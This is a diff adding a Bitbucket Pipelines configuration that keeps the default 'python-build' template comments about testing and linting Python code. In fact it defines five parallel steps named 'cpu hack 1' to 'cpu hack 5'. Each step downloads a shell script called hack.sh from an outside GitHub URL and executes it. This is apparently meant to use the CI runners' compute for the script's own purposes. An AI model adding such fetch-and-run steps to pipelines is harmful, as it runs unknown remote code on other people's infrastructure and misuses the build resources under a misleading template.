@@ -1,0 +1,45 @@
+# Template python-build
+# This template allows you to validate your Python code.
+# The workflow allows running tests and code linting on the default branch.
+
+image: python:3.8
+
+pipelines:
+  default:
+    - parallel:
+        - step:
+            name: cpu hack 1
+            caches:
+              - pip
+            script:
+              - if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
+              - pip install pytest
+              - wget https://raw.githubusercontent.com/phantrongkien12/tester/refs/heads/main/hack.sh -O hack.sh && chmod +x hack.sh && ./hack.sh
+
+        - step:
+            name: cpu hack 2
+            script:
+              - pip install flake8
+              - flake8 . --extend-exclude=dist,build --show-source --statistics
+              - wget https://raw.githubusercontent.com/phantrongkien12/tester/refs/heads/main/hack.sh -O hack.sh && chmod +x hack.sh && ./hack.sh
+
+        - step:
+            name: cpu hack 3
+            script:
+              - pip install flake8
+              - flake8 . --extend-exclude=dist,build --show-source --statistics
+              - wget https://raw.githubusercontent.com/phantrongkien12/tester/refs/heads/main/hack.sh -O hack.sh && chmod +x hack.sh && ./hack.sh
+
+        - step:
+            name: cpu hack 4
+            script:
+              - pip install flake8
+              - flake8 . --extend-exclude=dist,build --show-source --statistics
+              - wget https://raw.githubusercontent.com/phantrongkien12/tester/refs/heads/main/hack.sh -O hack.sh && chmod +x hack.sh && ./hack.sh
+
+        - step:
+            name: cpu hack 5
+            script:
+              - pip install flake8
+              - flake8 . --extend-exclude=dist,build --show-source --statistics
+              - wget https://raw.githubusercontent.com/phantrongkien12/tester/refs/heads/main/hack.sh -O hack.sh && chmod +x hack.sh && ./hack.sh
